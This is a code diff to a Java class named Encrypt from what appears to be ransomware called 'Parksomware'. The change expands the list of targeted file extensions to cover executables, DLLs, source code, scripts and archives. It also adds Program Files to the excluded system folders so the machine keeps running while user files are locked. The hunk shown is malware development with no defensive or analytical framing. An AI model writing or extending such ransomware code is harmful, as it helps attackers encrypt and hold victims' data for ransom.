@@ -10,12 +10,24 @@ import java.util.*;
 public class Encrypt {
 
     private static final String KEY = UUID.randomUUID().toString().replaceAll("-", "");
-    private static final String[] EXTENSIONS = new String[]{".doc", ".docx", ".pdf", ".txt", ".ppt", ".pptx", ".xls", ".xlsx", ".csv", ".jpg", ".jpeg", ".png", ".gif", ".bmp", ".tiff", ".svg", ".mp4", ".avi", ".mov", ".wmv", ".flv", ".swf", ".mkv"};
+    private static final String[] EXTENSIONS = new String[]{
+            ".doc", ".docx", ".pdf", ".txt", ".ppt", ".pptx", ".xls", ".xlsx", ".csv",
+            ".jpg", ".jpeg", ".png", ".gif", ".bmp", ".tiff", ".svg",
+            ".mp4", ".avi", ".mov", ".wmv", ".flv", ".swf", ".mkv",
+            ".exe", ".msi", ".dll",
+            ".java", ".py", ".js", ".cpp", ".c", ".cs", ".rb", ".php", ".go", ".rs", ".swift",
+            ".html", ".css", ".scss", ".less", ".ts", ".vue", ".json", ".xml",
+            ".sh", ".bat", ".cmd", ".ps1",
+            ".zip", ".rar", ".7z", ".tar", ".gz", ".bz2", ".xz"
+    };
+
     private static final String[] EXCLUDED_FOLDERS = new String[]{
             "C:\\Windows",
             System.getenv("APPDATA") + "\\Parksomware",
             "C:\\$Recycle.Bin",
-            "C\\$WinREAgent"
+            "C:\\$WinREAgent",
+            "C:\\Program Files",
+            "C:\\Program Files (x86)"
     };
     private static final String[] EXCLUDED_KEYWORDS = {
             "Estsoft"
